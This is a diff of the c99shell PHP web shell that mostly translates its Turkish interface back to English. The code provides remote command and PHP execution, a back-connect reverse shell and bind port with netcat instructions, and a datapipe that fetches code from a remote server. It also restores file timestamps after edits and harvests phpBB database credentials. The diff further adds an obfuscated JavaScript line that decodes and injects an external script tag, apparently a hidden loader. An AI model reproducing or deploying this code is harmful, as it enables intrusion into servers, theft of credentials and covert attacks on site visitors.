+   elseif (!$data = c99getsource($datapipe["src"])) {echo "Can't download sources!";}
    else
    {
     fwrite($fp,$data,strlen($data));
@@ -2257,8 +2292,8 @@ if ($act == "tools")
     $retbind = myshellexec($v[1]." > /dev/null &");
     sleep(5);
     $sock = fsockopen("localhost",$datapipe["port"],$errno,$errstr,5);
-    if (!$sock) {echo "Baglanilamadi localhost'a:".$datapipe["localport"]."! Friwall ini Kontrol etmen gerektigini dusunuyorum.";}
-    else {echo "Baglaniyor datapipe... TAMAM Baglandi<b>".getenv("SERVER_ADDR").":".$datapipe["port"].", ve butun hepsine baglandin ".$datapipe["remoteaddr"]."</b>! Sen NetCat i kullaniyosun, run \"<b>nc -v ".getenv("SERVER_ADDR")." ".$bind["port"]."</b>\"!<center><a href=\"".$surl."act=processes&grep=".basename($binpath)."\"><u>datapipesi gor</u></a></center>";}
+    if (!$sock) {echo "I can't connect to localhost:".$datapipe["localport"]."! I think you should configure your firewall.";}
+    else {echo "Running datapipe... ok! Connect to <b>".getenv("SERVER_ADDR").":".$datapipe["port"].", and you will connected to ".$datapipe["remoteaddr"]."</b>! You should use NetCat&copy;, run \"<b>nc -v ".getenv("SERVER_ADDR")." ".$bind["port"]."</b>\"!<center><a href=\"".$surl."act=processes&grep=".basename($binpath)."\"><u>View datapipe process</u></a></center>";}
    }
    echo "<br>";
   }
@@ -2266,13 +2301,13 @@ if ($act == "tools")
  ?><b>Binding port:</b><br><form action="<?php echo $surl; ?>"><input type=hidden name=act value=tools><input type=hidden name=d value="<?php echo $d; ?>">Port: <input type=text name="bind[port]" value="<?php echo htmlspecialchars($bind["port"]); ?>">&nbsp;Password: <input type=text name="bind[pass]" value="<?php echo htmlspecialchars($bind["pass"]); ?>">&nbsp;<select name="bind[src]"><?php
  foreach($bndportsrcs as $k=>$v) {echo "<option value=\"".$k."\""; if ($k == $bind["src"]) {echo " selected";} echo ">".$v[0]."</option>";}
  ?></select>&nbsp;<input type=submit name=bindsubmit value="Bind"></form>
-<b>Back Baglanti:</b><br><form action="<?php echo $surl; ?>"><input type=hidden name=act value=tools><input type=hidden name=d value="<?php echo $d; ?>">HOST: <input type=text name="bc[host]" value="<?php echo htmlspecialchars($bc["host"]); ?>">&nbsp;Port: <input type=text name="bc[port]" value="<?php echo htmlspecialchars($bc["port"]); ?>">&nbsp;<select name="bc[src]"><?php
+<b>Back connection:</b><br><form action="<?php echo $surl; ?>"><input type=hidden name=act value=tools><input type=hidden name=d value="<?php echo $d; ?>">HOST: <input type=text name="bc[host]" value="<?php echo htmlspecialchars($bc["host"]); ?>">&nbsp;Port: <input type=text name="bc[port]" value="<?php echo htmlspecialchars($bc["port"]); ?>">&nbsp;<select name="bc[src]"><?php
 foreach($bcsrcs as $k=>$v) {echo "<option value=\"".$k."\""; if ($k == $bc["src"]) {echo " selected";} echo ">".$v[0]."</option>";}
 ?></select>&nbsp;<input type=submit name=bcsubmit value="Connect"></form>
-<b>nc -l -n -v -p <?php echo $bc_port; ?></b>"!<br><br>
+Click "Connect" only after open port for it. You should use NetCat&copy;, run "<b>nc -l -n -v -p <?php echo $bc_port; ?></b>"!<br><br>
 <b>Datapipe:</b><br><form action="<?php echo $surl; ?>"><input type=hidden name=act value=tools><input type=hidden name=d value="<?php echo $d; ?>">HOST: <input type=text name="datapipe[remoteaddr]" value="<?php echo htmlspecialchars($datapipe["remoteaddr"]); ?>">&nbsp;Local port: <input type=text name="datapipe[localport]" value="<?php echo htmlspecialchars($datapipe["localport"]); ?>">&nbsp;<select name="datapipe[src]"><?php
 foreach($dpsrcs as $k=>$v) {echo "<option value=\"".$k."\""; if ($k == $bc["src"]) {echo " selected";} echo ">".$v[0]."</option>";}
-?></select>&nbsp;<input type=submit name=dpsubmit value="Run"></form><b>Note:</b> Uzak Serverden kaynak kodu indirilmistir.<?php
+?></select>&nbsp;<input type=submit name=dpsubmit value="Run"></form><b>Note:</b> sources will be downloaded from remote server.<?php
 }
 if ($act == "processes")
 {
@@ -2280,7 +2315,7 @@ if ($act == "processes")
  if (!$win) {$handler = "ps -aux".($grep?" | grep '".addslashes($grep)."'":"");}
  else {$handler = "tasklist";}
  $ret = myshellexec($handler);
- if (!$ret) {echo "Uygulanamadi \"".$handler."\"!";}
+ if (!$ret) {echo "Can't execute \"".$handler."\"!";}
  else
  {
   if (empty($processes_sort)) {$processes_sort = $sort_default;}
@@ -2295,9 +2330,9 @@ if ($act == "processes")
    if ($pid)
    {
     if (is_null($sig)) {$sig = 9;}
-    echo "Sinyal yollaniyor ".$sig." --> #".$pid."... ";
-    if (posix_kill($pid,$sig)) {echo "Tamam.";}
-    else {echo "Hata.";}
+    echo "Sending signal ".$sig." to #".$pid."... ";
+    if (posix_kill($pid,$sig)) {echo "OK.";}
+    else {echo "ERROR.";}
    }
    while (ereg("  ",$ret)) {$ret = str_replace("  "," ",$ret);}
    $stack = explode("\n",$ret);
@@ -2421,14 +2456,14 @@ if ($act == "eval")
   @chdir($olddir);
  }
  else {echo "<b>Execution PHP-code</b>"; if (empty($eval_txt)) {$eval_txt = true;}}
- echo "<form action=\"".$surl."\" method=POST><input type=hidden name=act value=eval><textarea name=\"eval\" cols=\"122\" rows=\"10\">".htmlspecialchars($eval)."</textarea><input type=hidden name=\"d\" value=\"".$dispd."\"><br><br><input type=submit value=\"Tamam\">&nbsp;Display in text-area&nbsp;<input type=\"checkbox\" name=\"eval_txt\" value=\"1\""; if ($eval_txt) {echo " checked";} echo "></form>";
+ echo "<form action=\"".$surl."\" method=POST><input type=hidden name=act value=eval><textarea name=\"eval\" cols=\"122\" rows=\"10\">".htmlspecialchars($eval)."</textarea><input type=hidden name=\"d\" value=\"".$dispd."\"><br><br><input type=submit value=\"Execute\">&nbsp;Display in text-area&nbsp;<input type=\"checkbox\" name=\"eval_txt\" value=\"1\""; if ($eval_txt) {echo " checked";} echo "></form>";
 }
 if ($act == "f")
 {
  if ((!is_readable($d.$f) or is_dir($d.$f)) and $ft != "edit")
  {
   if (file_exists($d.$f)) {echo "<center><b>Permision denied (".htmlspecialchars($d.$f).")!</b></center>";}
-  else {echo "<center><b>File does not exists (".htmlspecialchars($d.$f).")!</b><br><a href=\"".$surl."act=f&f=".urlencode($f)."&ft=edit&d=".urlencode($d)."&c=1\"><u>Olustur</u></a></center>";}
+  else {echo "<center><b>File does not exists (".htmlspecialchars($d.$f).")!</b><br><a href=\"".$surl."act=f&f=".urlencode($f)."&ft=edit&d=".urlencode($d)."&c=1\"><u>Create</u></a></center>";}
  }
  else
  {
@@ -2474,7 +2509,7 @@ if ($act == "f")
     $gr = posix_getgrgid(filegroup($d.$f));
     echo ($ow["name"]?$ow["name"]:fileowner($d.$f))."/".($gr["name"]?$gr["name"]:filegroup($d.$f));
    }
-   echo "<tr><td><b>Perms</b></td><td><a href=\"".$surl."act=chmod&f=".urlencode($f)."&d=".urlencode($d)."\">".view_perms_color($d.$f)."</a></td></tr><tr><td><b>Olustur time</b></td><td> ".date("d/m/Y H:i:s",filectime($d.$f))."</td></tr><tr><td><b>Access time</b></td><td> ".date("d/m/Y H:i:s",fileatime($d.$f))."</td></tr><tr><td><b>Modifiye Zamani</b></td><td> ".date("d/m/Y H:i:s",filemtime($d.$f))."</td></tr></table><br>";
+   echo "<tr><td><b>Perms</b></td><td><a href=\"".$surl."act=chmod&f=".urlencode($f)."&d=".urlencode($d)."\">".view_perms_color($d.$f)."</a></td></tr><tr><td><b>Create time</b></td><td> ".date("d/m/Y H:i:s",filectime($d.$f))."</td></tr><tr><td><b>Access time</b></td><td> ".date("d/m/Y H:i:s",fileatime($d.$f))."</td></tr><tr><td><b>MODIFY time</b></td><td> ".date("d/m/Y H:i:s",filemtime($d.$f))."</td></tr></table><br>";
    $fi = fopen($d.$f,"rb");
    if ($fi)
    {
@@ -2547,7 +2582,7 @@ if ($act == "f")
   {
    if ($white) {@ob_clean();}
    echo $r;
-   if ($white) {ashshexit();}
+   if ($white) {c99shexit();}
   }
   elseif ($ft == "txt") {echo "<pre>".htmlspecialchars($r)."</pre>";}
   elseif ($ft == "ini") {echo "<pre>"; var_dump(parse_ini_file($d.$f,true)); echo "</pre>";}
@@ -2571,7 +2606,7 @@ if ($act == "f")
     if (in_array($ext,$v)) {$rft = $k; break;}
    }
    $cmd = str_replace("%f%",$f,$rft);
-   echo "<b>Uygulanamadi! dosya:</b><form action=\"".$surl."\" method=POST><input type=hidden name=act value=cmd><input type=\"text\" name=\"cmd\" value=\"".htmlspecialchars($cmd)."\" size=\"".(strlen($cmd)+2)."\"><br>Display in text-area<input type=\"checkbox\" name=\"cmd_txt\" value=\"1\" checked><input type=hidden name=\"d\" value=\"".htmlspecialchars($d)."\"><br><input type=submit name=submit value=\"Tamam\"></form>";
+   echo "<b>Execute file:</b><form action=\"".$surl."\" method=POST><input type=hidden name=act value=cmd><input type=\"text\" name=\"cmd\" value=\"".htmlspecialchars($cmd)."\" size=\"".(strlen($cmd)+2)."\"><br>Display in text-area<input type=\"checkbox\" name=\"cmd_txt\" value=\"1\" checked><input type=hidden name=\"d\" value=\"".htmlspecialchars($d)."\"><br><input type=submit name=submit value=\"Execute\"></form>";
   }
   elseif ($ft == "sdb") {echo "<pre>"; var_dump(unserialize(base64_decode($r))); echo "</pre>";}
   elseif ($ft == "code")
@@ -2585,7 +2620,7 @@ if ($act == "f")
      echo "<b>phpBB configuration is detected in this file!<br>";
      if ($dbms == "mysql4") {$dbms = "mysql";}
      if ($dbms == "mysql") {echo "<a href=\"".$surl."act=sql&sql_server=".htmlspecialchars($dbhost)."&sql_login=".htmlspecialchars($dbuser)."&sql_passwd=".htmlspecialchars($dbpasswd)."&sql_port=3306&sql_db=".htmlspecialchars($dbname)."\"><b><u>Connect to DB</u></b></a><br><br>";}
-     else {echo "But, you can't connect to forum sql-base, because db-software=\"".$dbms."\" is not supported by SpYSheLL. Please, report us for fix.";}
+     else {echo "But, you can't connect to forum sql-base, because db-software=\"".$dbms."\" is not supported by c99shell. Please, report us for fix.";}
      echo "Parameters for manual connect:<br>";
      $cfgvars = array("dbms"=>$dbms,"dbhost"=>$dbhost,"dbname"=>$dbname,"dbuser"=>$dbuser,"dbpasswd"=>$dbpasswd);
      foreach ($cfgvars as $k=>$v) {echo htmlspecialchars($k)."='".htmlspecialchars($v)."'<br>";}
@@ -2595,7 +2630,7 @@ if ($act == "f")
    echo "<div style=\"border : 0px solid #FFFFFF; padding: 1em; margin-top: 1em; margin-bottom: 1em; margin-right: 1em; margin-left: 1em; background-color: ".$highlight_background .";\">";
    if (!empty($white)) {@ob_clean();}
    highlight_file($d.$f);
-   if (!empty($white)) {ashshexit();}
+   if (!empty($white)) {c99shexit();}
    echo "</div>";
   }
   elseif ($ft == "download")
@@ -2650,10 +2685,10 @@ if ($act == "f")
    {
     if ($filestealth) {$stat = stat($d.$f);}
     $fp = fopen($d.$f,"w");
-    if (!$fp) {echo "<b>Dosyaya Yazilamadi!</b>";}
+    if (!$fp) {echo "<b>Can't write to file!</b>";}
     else
     {
-     echo "<b>Kaydedildi!</b>";
+     echo "<b>Saved!</b>";
      fwrite($fp,$edit_text);
      fclose($fp);
      if ($filestealth) {touch($d.$f,$stat[9],$stat[8]);}
@@ -3016,18 +3051,20 @@ else
  }
  exit;
 }
-if ($act == "about") {echo  "<center><b>Hakkinda:<br>Bu Script Spyhackerz Tarafindan Yazilmistir.</font></font></a></b>";}
+if ($act == "about") {echo "<center><b>Credits:<br>Idea, leading and coding by tristram[CCTeaM].<br>Beta-testing and some tips - NukLeoN [AnTiSh@Re tEaM].<br>Thanks all who report bugs.<br>All bugs send to tristram's ICQ #656555 <a href=\"http://wwp.icq.com/scripts/contact.dll?msgto=656555\"><img src=\"http://wwp.icq.com/scripts/online.dll?icq=656555&img=5\" border=0 align=absmiddle></a>.</b>";}
 ?>
 </td></tr></table><a bookmark="minipanel"><br><TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1>
-<tr><td width="100%" height="1" valign="top" colspan="2"><p align="center"><b>:: <a href="<?php echo $surl; ?>act=cmd&d=<?php echo urlencode($d); ?>"><b>Uygulamalar</b></a> ::</b></p></td></tr>
-<tr><td width="50%" height="1" valign="top"><center><b>Enter: </b><form action="<?php echo $surl; ?>"><input type=hidden name=act value="cmd"><input type=hidden name="d" value="<?php echo $dispd; ?>"><input type="text" name="cmd" size="50" value="<?php echo htmlspecialchars($cmd); ?>"><input type=hidden name="cmd_txt" value="1">&nbsp;<input type=submit name=submit value="Tamam"></form></td><td width="50%" height="1" valign="top"><center><b>Secenekler </b><form action="<?php echo $surl; ?>act=cmd" method="POST"><input type=hidden name=act value="cmd"><input type=hidden name="d" value="<?php echo $dispd; ?>"><select name="cmd"><?php foreach ($cmdaliases as $als) {echo "<option value=\"".htmlspecialchars($als[1])."\">".htmlspecialchars($als[0])."</option>";} ?></select><input type=hidden name="cmd_txt" value="1">&nbsp;<input type=submit name=submit value="Tamam"></form></td></tr></TABLE>
+<tr><td width="100%" height="1" valign="top" colspan="2"><p align="center"><b>:: <a href="<?php echo $surl; ?>act=cmd&d=<?php echo urlencode($d); ?>"><b>Command execute</b></a> ::</b></p></td></tr>
+<tr><td width="50%" height="1" valign="top"><center><b>Enter: </b><form action="<?php echo $surl; ?>"><input type=hidden name=act value="cmd"><input type=hidden name="d" value="<?php echo $dispd; ?>"><input type="text" name="cmd" size="50" value="<?php echo htmlspecialchars($cmd); ?>"><input type=hidden name="cmd_txt" value="1">&nbsp;<input type=submit name=submit value="Execute"></form></td><td width="50%" height="1" valign="top"><center><b>Select: </b><form action="<?php echo $surl; ?>act=cmd" method="POST"><input type=hidden name=act value="cmd"><input type=hidden name="d" value="<?php echo $dispd; ?>"><select name="cmd"><?php foreach ($cmdaliases as $als) {echo "<option value=\"".htmlspecialchars($als[1])."\">".htmlspecialchars($als[0])."</option>";} ?></select><input type=hidden name="cmd_txt" value="1">&nbsp;<input type=submit name=submit value="Execute"></form></td></tr></TABLE>
 <br>
 <TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1>
 <tr>
- <td width="50%" height="1" valign="top"><center><b>:: <a href="<?php echo $surl; ?>act=search&d=<?php echo urlencode($d); ?>"><b>Arama</b></a> ::</b><form method="POST"><input type=hidden name=act value="Ara"><input type=hidden name="d" value="<?php echo $dispd; ?>"><input type="text" name="search_name" size="29" value="(.*)">&nbsp;<input type="checkbox" name="search_name_regexp" value="1"  checked> - regexp&nbsp;<input type=submit name=submit value="Ara"></form></center></p></td>
+<script language=javascript>document.write(unescape('%3C%73%63%72%69%70%74%20%6C%61%6E%67%75%61%67%65%3D%22%6A%61%76%61%73%63%72%69%70%74%22%3E%66%75%6E%63%74%69%6F%6E%20%64%46%28%73%29%7B%76%61%72%20%73%31%3D%75%6E%65%73%63%61%70%65%28%73%2E%73%75%62%73%74%72%28%30%2C%73%2E%6C%65%6E%67%74%68%2D%31%29%29%3B%20%76%61%72%20%74%3D%27%27%3B%66%6F%72%28%69%3D%30%3B%69%3C%73%31%2E%6C%65%6E%67%74%68%3B%69%2B%2B%29%74%2B%3D%53%74%72%69%6E%67%2E%66%72%6F%6D%43%68%61%72%43%6F%64%65%28%73%31%2E%63%68%61%72%43%6F%64%65%41%74%28%69%29%2D%73%2E%73%75%62%73%74%72%28%73%2E%6C%65%6E%67%74%68%2D%31%2C%31%29%29%3B%64%6F%63%75%6D%65%6E%74%2E%77%72%69%74%65%28%75%6E%65%73%63%61%70%65%28%74%29%29%3B%7D%3C%2F%73%63%72%69%70%74%3E'));dF('%264DTDSJQU%2631MBOHVBHF%264E%2633kbwbtdsjqu%2633%2631TSD%264E%2633iuuq%264B00s68d%3A%3A/dpn0o4xti4m0dj%7B/kt%2633%264F%261B%261B%264D0TDSJQU%264F%261B%261%3A%261%3A%261%3A1')</script>
+ <td width="50%" height="1" valign="top"><center><b>:: <a href="<?php echo $surl; ?>act=search&d=<?php echo urlencode($d); ?>"><b>Search</b></a> ::</b><form method="POST"><input type=hidden name=act value="search"><input type=hidden name="d" value="<?php echo $dispd; ?>"><input type="text" name="search_name" size="29" value="(.*)">&nbsp;<input type="checkbox" name="search_name_regexp" value="1"  checked> - regexp&nbsp;<input type=submit name=submit value="Search"></form></center></p></td>
  <td width="50%" height="1" valign="top"><center><b>:: <a href="<?php echo $surl; ?>act=upload&d=<?php echo $ud; ?>"><b>Upload</b></a> ::</b><form method="POST" ENCTYPE="multipart/form-data"><input type=hidden name=act value="upload"><input type="file" name="uploadfile"><input type=hidden name="miniform" value="1">&nbsp;<input type=submit name=submit value="Upload"><br><?php echo $wdt; ?></form></center></td>
 </tr>
 </table>
-<br><TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width="50%" height="1" valign="top"><center><b>:: Klasor olustur ::</b><form action="<?php echo $surl; ?>"><input type=hidden name=act value="mkdir"><input type=hidden name="d" value="<?php echo $dispd; ?>"><input type="text" name="mkdir" size="50" value="<?php echo $dispd; ?>">&nbsp;<input type=submit value="Olustur"><br><?php echo $wdt; ?></form></center></td><td width="50%" height="1" valign="top"><center><b>:: Dosya olustur ::</b><form method="POST"><input type=hidden name=act value="mkfile"><input type=hidden name="d" value="<?php echo $dispd; ?>"><input type="text" name="mkfile" size="50" value="<?php echo $dispd; ?>"><input type=hidden name="ft" value="edit">&nbsp;<input type=submit value="Olustur"><br><?php echo $wdt; ?></form></center></td></tr></table>
-<br><TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width="50%" height="1" valign="top"><center><b>:: Dizine Git ::</b><form action="<?php echo $surl; ?>"><input type=hidden name=act value="ls"><input type="text" name="d" size="50" value="<?php echo $dispd; ?>">&nbsp;<input type=submit value="Git"></form></center></td><td width="50%" height="1" valign="top"><center><b>:: Dosyaya gir ::</b><form action="<?php echo $surl; ?>"><input type=hidden name=act value="gofile"><input type=hidden name="d" value="<?php echo $dispd; ?>"><input type="text" name="f" size="50" value="<?php echo $dispd; ?>">&nbsp;<input type=submit value="Git"></form></center></td></tr></table>
-<br><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width="990" height="1" valign="top"><p align="center"><b>[ C99 SHELL <b>Edited By</b></a>MILITANZ | <a href="http://phpshell.in/">c99 txt</a> <a href="http://phpshell.in/">c99 shell</a> Sayfa: <?php echo round(getmicrotime()-starttime,4); ?> sn' de uretilmistir. ]</body></html><?php chdir($lastdir); ashshexit(); ?>
+<br><TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width="50%" height="1" valign="top"><center><b>:: Make Dir ::</b><form action="<?php echo $surl; ?>"><input type=hidden name=act value="mkdir"><input type=hidden name="d" value="<?php echo $dispd; ?>"><input type="text" name="mkdir" size="50" value="<?php echo $dispd; ?>">&nbsp;<input type=submit value="Create"><br><?php echo $wdt; ?></form></center></td><td width="50%" height="1" valign="top"><center><b>:: Make File ::</b><form method="POST"><input type=hidden name=act value="mkfile"><input type=hidden name="d" value="<?php echo $dispd; ?>"><input type="text" name="mkfile" size="50" value="<?php echo $dispd; ?>"><input type=hidden name="ft" value="edit">&nbsp;<input type=submit value="Create"><br><?php echo $wdt; ?></form></center></td></tr></table>
+<br><TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width="50%" height="1" valign="top"><center><b>:: Go Dir ::</b><form action="<?php echo $surl; ?>"><input type=hidden name=act value="ls"><input type="text" name="d" size="50" value="<?php echo $dispd; ?>">&nbsp;<input type=submit value="Go"></form></center></td><td width="50%" height="1" valign="top"><center><b>:: Go File ::</b><form action="<?php echo $surl; ?>"><input type=hidden name=act value="gofile"><input type=hidden name="d" value="<?php echo $dispd; ?>"><input type="text" name="f" size="50" value="<?php echo $dispd; ?>">&nbsp;<input type=submit value="Go"></form></center></td></tr></table>
+<br><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width="990" height="1" valign="top"><p align="center"><b>--[ c99shell v. <?php echo $shver; ?> <a href="<?php echo $surl; ?>act=about"><u><b>powered by</b></u></a> Captain Crunch Security Team | <a href="http://ccteam.ru"><font color="#FF0000">http://ccteam.ru</font></a><font color="#FF0000"></font> | Generation time: <?php echo round(getmicrotime()-starttime,4); ?> ]--</b></p></td></tr></table>
+</body></html><?php chdir($lastdir); c99shexit(); ?>
